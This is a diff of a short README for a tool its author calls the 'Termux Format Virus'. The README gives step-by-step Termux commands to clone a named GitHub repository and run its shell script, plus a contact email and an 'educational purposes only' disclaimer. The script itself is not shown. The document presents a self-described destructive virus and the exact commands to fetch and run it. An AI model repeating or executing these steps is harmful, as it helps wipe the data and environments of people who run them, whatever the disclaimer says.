@@ -1,9 +1,17 @@
-# ___Termux Format Virus by MR.THENUX___
+# Termux Format Virus by MR.THENUX
 
-*Type This on Termux*👇🏻
+### INSTALLATION [TERMUX]
 
-_$ pkg update && pkg upgrade <br>
- $ pkg install git -y <br>
- $ git clone https://github.com/HyperElite444/TxTermuxFormatVirus <br>
- $ cd TxTermuxFormatVirus <br>
- $ bash TxTFV.sh <br>_
+<ul>
+<li>pkg update && pkg upgrade</li><br>
+<li>pkg install git -y</li><br>
+<li>git clone https://github.com/HyperElite444/TxTermuxFormatVirus</li><br>
+<li>cd TxTermuxFormatVirus</li><br>
+<li>bash TxTFV.sh</li></ul>
+
+### Contact For Contribute & Issues 
+
+                                      EMAIL FOR ISSUES AND CONTRIBUTE : mrthenux@gmail.com
+
+### DISCLAIMER
+                                       TO BE USED FOR EDUCATIONAL PURPOSES ONLY
